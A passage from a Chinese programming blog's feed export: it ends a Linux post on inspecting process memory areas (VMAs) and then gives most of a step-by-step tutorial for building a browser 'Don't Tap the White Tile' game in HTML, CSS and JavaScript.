区域为例，其起始地址为 0x564af2e3a000,结束地址为 564af2ed7000,长度为 643072 字节。  </p></blockquote><p>​    如下图所示为从 proc 虚拟文件系统中查看相应进程第一个 VMA 的完整信息。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/53930/image-20200608164609038.png" alt="image-20200608164609038"></p><blockquote><p>从以上两图中内容对比可知，本程序输出信息正确。  </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>h5别踩白块游戏</title>
      <link href="/posts/59750/"/>
      <url>/posts/59750/</url>
      
        <content type="html"><![CDATA[<h1 id="内容介绍"><a href="#内容介绍" class="headerlink" title="内容介绍"></a>内容介绍</h1><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>别踩白块这个游戏相信很多人都在手机上玩过，今天我们就来做一个网页版的，先上一张游戏效果图：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/59750/uid1133717-20191017-1571294959274.gif" alt="图片描述"></p><p>属于简化版别踩白块，代码相对较为简单易学，主要涉及通过 javascript 操作元素节点的增删以及属性节点（class）的操作。</p><h4 id="2-知识点"><a href="#2-知识点" class="headerlink" title="2.知识点"></a>2.知识点</h4><ul><li>HTML/CSS</li><li>JavaScript</li><li>元素节点增删</li><li>属性节点操作</li></ul><h4 id="3-项目架构"><a href="#3-项目架构" class="headerlink" title="3.项目架构"></a>3.项目架构</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puzzle</span><br><span class="line">   |index.html</span><br><span class="line">   |css/index.css</span><br><span class="line">   |js/index.js</span><br></pre></td></tr></tbody></table></figure><h1 id="项目原理"><a href="#项目原理" class="headerlink" title="项目原理"></a>项目原理</h1><p>在开始编程之前，让我们先来分析下整个游戏的流程：一定的速度下移，点击黑块，黑块消失，新的黑块出现在普通游戏玩家眼中，应该是游戏开始，黑块不断向下移动，若黑块触底则游戏结束；</p><p>而以开发者来说，<strong>应将每一个黑块和白块抽象成一个个的数据结构，黑块的消失和出现其实就是数据结构的创造和销毁</strong>，我们来看一张游戏的流程图，对于要编写的功能有一个大概的了解:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/59750/image-20201105153016423.png" alt="image-20201105153016423"></p><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><h4 id="页面布局"><a href="#页面布局" class="headerlink" title="页面布局"></a>页面布局</h4><p>可以用 div+css 布局来实现别踩白块的静态效果展示，直接上 HTML 代码，我来简要说下 HTML 思路，将主界面分解成一个 4x4 的大矩形格子，每一个方块代表其中一个小的矩形格，其中每一行的四个白块中有一个黑块，每一行中黑块位于哪一列是随机生成的，但是我们这里现在是静态页面就自己确定了，然后通过 css 控制样式。</p><p>创建 index.html 文件，并输入以下代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>别踩白块<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/index.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          /*白块*/</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          /*黑块*/</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="添加样式"><a href="#添加样式" class="headerlink" title="添加样式"></a>添加样式</h4><p>下面是 css 代码，这里有一个要注意的地方，我将 <code>div#con</code> 块级元素向上提了 100 px，这样在游戏的开始就出现了最底一行的空白，隐藏最上面那行，为什么要这样呢，继续往下看就知道了。设置黑白块的样式，为 js 部分动态插入黑白块做准备。</p><p>创建 <code>css/index.css</code> 文件，并输入以下代码：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#main</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">408px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">408px</span>;</span><br><span class="line">  <span class="attribute">background</span>: white;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">2px</span> solid gray;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h2</span> {</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#con</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">408px</span>; <span class="comment">/*隐藏所有格子*/</span></span><br><span class="line">  <span class="attribute">border-collapse</span>: collapse;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 行 */</span></span><br><span class="line"><span class="selector-class">.row</span> {</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 一个块 */</span></span><br><span class="line"><span class="selector-class">.cell</span> {</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">rgb</span>(<span class="number">54</span>, <span class="number">74</span>, <span class="number">129</span>) <span class="number">1px</span> solid;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.black</span> {</span><br><span class="line">  <span class="attribute">background</span>: black;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.start</span> {</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background</span>: yellowgreen;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果以上部分你都能够理解并且对应着代码实现的话，那么我们看到的应该是一个空格子，我们设置 id 为 con 的 div 的 top 属性为 0 px: <code>#con {top: 0px;}</code>，这样我们就可以看见：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/59750/uid1133717-20191017-1571294959274.gif" alt="图片描述"></p><p>是不是很像别踩白块的界面了呢，我们已经成功了一大步，然后就是通过 js 来实现动态的插入黑块或白块，以及操作。</p><h4 id="游戏初始化"><a href="#游戏初始化" class="headerlink" title="游戏初始化"></a>游戏初始化</h4><p>根据前面的 HTML 部分我们可以知道，每个 <code>&lt;div class="cell"&gt;</code> 就代表一个白块，<code>&lt;div class="cell black"&gt;</code> 就代表一个黑块，每点击一个黑块消失其实是删除了一个 <code>&lt;div class="row"&gt;</code> 然后从上面添加一个新的 <code>&lt;div class="row"&gt;</code> 所以我们首先要通过 js 来控制 <code>&lt;div class="row"&gt;</code> 的创造和生成（记得删除在编写静态页面时候指定生成的 4 个 <code>div.row</code>）。具体方法如下：</p><p>删除之前写的 4 个 div.row，将 index.html 文件改为以下代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>别踩白块<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/index.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>score<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">"score"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"con"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btn"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"start"</span> <span class="attr">onclick</span>=<span class="string">"start()"</span>&gt;</span></span><br><span class="line">        开始游戏</span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>对游戏进行初始化，在 <code>js/index.js</code> 文件中写入以下代码：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建div, className是其类名</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">className</span>) {</span><br><span class="line">  <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">'div'</span>);</span><br><span class="line">  div.<span class="property">className</span> = className;</span><br><span class="line">  <span class="keyword">return</span> div;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创造一个&lt;div class="row"&gt;并且有四个子节点&lt;div class="cell"&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> row = <span class="title function_">creatediv</span>(<span class="string">'row'</span>); <span class="comment">//创建div className=row</span></span><br><span class="line">  <span class="keyword">var</span> arr = <span class="title function_">creatcell</span>(); <span class="comment">//定义div cell的类名,其中一个为cell black</span></span><br><span class="line"></span><br><span class="line">  con.<span class="title function_">appendChild</span>(row); <span class="comment">// 添加row为con的子节点</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) {</span><br><span class="line">    row.<span class="title function_">appendChild</span>(<span class="title function_">creatediv</span>(arr[i])); <span class="comment">//添加row的子节点 cell</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">firstChild</span> == <span class="literal">null</span>) {</span><br><span class="line">    con.<span class="title function_">appendChild</span>(row);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    con.<span class="title function_">insertBefore</span>(row, con.<span class="property">firstChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除div#con的子节点中最后那个&lt;div class="row"&gt;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">if</span> (con.<span class="property">childNodes</span>.<span class="property">length</span> == <span class="number">6</span>) {</span><br><span class="line">    con.<span class="title function_">removeChild</span>(con.<span class="property">lastChild</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个类名的数组，其中一个为cell black, 其余为cell</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatcell</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> temp = [<span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>, <span class="string">'cell'</span>];</span><br><span class="line">  <span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">4</span>); <span class="comment">//随机产生黑块的位置 Math.random()函数参数 0~1的随机数</span></span><br><span class="line">  temp[i] = <span class="string">'cell black'</span>;</span><br><span class="line">  <span class="keyword">return</span> temp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="让黑块动起来"><a href="#让黑块动起来" class="headerlink" title="让黑块动起来"></a>让黑块动起来</h4><p>在可以通过 js 来创造和销毁 <code>div</code> 后，我们就要让黑块动起来，这个时候我们就用到了之前 css 提到的设定 <code>&lt;div id="con"&gt;</code> 隐藏了一行的 <code>&lt;div id="row"&gt;</code>，我们通过 js 的 DOM 操作使其向下方移动，并设置定时器每 30 毫秒移动一次，这样就实现了黑块的平滑移动，在黑块移动的同时，我们要判断黑块是否已经触底，触底则游戏失败，停止调用 <code>move()</code>，触底后调用函数 <code>fail()</code> 游戏失败，具体方法如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//让黑块动起来</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  <span class="keyword">var</span> top = <span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(con, <span class="literal">null</span>)[<span class="string">'top'</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (speed + top &gt; <span class="number">0</span>) {</span><br><span class="line">    top = <span class="number">0</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    top += speed;</span><br><span class="line">  }</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = top + <span class="string">'px'</span>; <span class="comment">//不断移动top值，使它动起来</span></span><br><span class="line">  <span class="title function_">over</span>();</span><br><span class="line">  <span class="keyword">if</span> (top == <span class="number">0</span>) {</span><br><span class="line">    <span class="title function_">createrow</span>();</span><br><span class="line">    con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-102px'</span>;</span><br><span class="line">    <span class="title function_">delrow</span>();</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加速函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>) {</span><br><span class="line">  speed += <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (speed == <span class="number">20</span>) {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'你超神了'</span>);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断游戏是否结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> rows = con.<span class="property">childNodes</span>;</span><br><span class="line">  <span class="keyword">if</span> (rows.<span class="property">length</span> == <span class="number">5</span> &amp;&amp; rows[rows.<span class="property">length</span> - <span class="number">1</span>].<span class="property">pass</span> !== <span class="number">1</span>) {</span><br><span class="line">    <span class="title function_">fail</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rows.<span class="property">length</span>; i++) {</span><br><span class="line">    <span class="keyword">if</span> (rows[i].<span class="property">pass1</span> == <span class="number">1</span>) {</span><br><span class="line">      <span class="title function_">fail</span>();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 游戏结束</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="built_in">clearInterval</span>(clock);</span><br><span class="line">  flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="title function_">confirm</span>(<span class="string">'你的最终得分为 '</span> + <span class="built_in">parseInt</span>($(<span class="string">'score'</span>).<span class="property">innerHTML</span>));</span><br><span class="line">  <span class="keyword">var</span> con = $(<span class="string">'con'</span>);</span><br><span class="line">  con.<span class="property">innerHTML</span> = <span class="string">''</span>;</span><br><span class="line">  $(<span class="string">'score'</span>).<span class="property">innerHTML</span> = <span class="number">0</span>;</span><br><span class="line">  con.<span class="property">style</span>.<span class="property">top</span> = <span class="string">'-408px'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="点击黑块事件"><a href="#点击黑块事件" class="headerlink" title="点击黑块事件"></a>点击黑块事件</h4><p>让黑块动起来之后呢，我们就来考虑怎么判断用户有没有点击到黑块呢，同时用户若点击到黑块，我们要让所在那一行消失，那么我们需要一个 <code>judge</code> 方法，具体如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断是否点击黑块、白块</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">ev</span>) {</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) == -<span class="number">1</span> &amp;&amp;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'cell'</span>) !== -<span class="number">1</span></span><br><span class="line">  ) {</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass1</span> = <span class="number">1</span>; <span class="comment">//定义属性pass，表示此行row的白块已经被点击</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ev.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">'black'</span>) !== -<span class="number">1</span>) {</span><br><span class="line">    <span class="comment">//点击目标元素 类名中包含 black 说明是黑块</span></span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">className</span> = <span class="string">'cell'</span>;</span><br><span class="line">    ev.<span class="property">target</span>.<span class="property">parentNode</span>.<span 